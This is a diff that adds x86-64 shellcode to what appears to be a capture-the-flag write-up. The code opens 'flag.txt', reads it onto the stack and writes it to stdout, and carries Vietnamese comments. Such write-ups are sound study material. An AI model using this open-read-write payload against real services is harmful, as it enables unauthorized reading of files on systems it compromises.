@@ -223,7 +223,36 @@ Output:
 
 Assembly code:
 ```asm
+	; file flag.txt
+    mov rbx, 0
+    push rbx
+    mov rbx, 0x7478742e67616c66
+    push rbx
 
+    ; open() file
+    mov rax, 2
+    mov rdi, rsp
+    mov rsi, 0
+    mov rdx, 0
+    syscall
+
+    mov rbx, rax ; luu fd tu open()
+
+    sub rsp, 0x50 ; tao buffer de luu flag value
+
+    ; read() file to stack
+    mov rax, 0
+    mov rdi, rbx
+    mov rsi, rsp
+    mov rdx, 64
+    syscall
+
+    ; write() output tu stack
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, rsp
+    mov rdx, 64
+    syscall
 ```
 
 ___
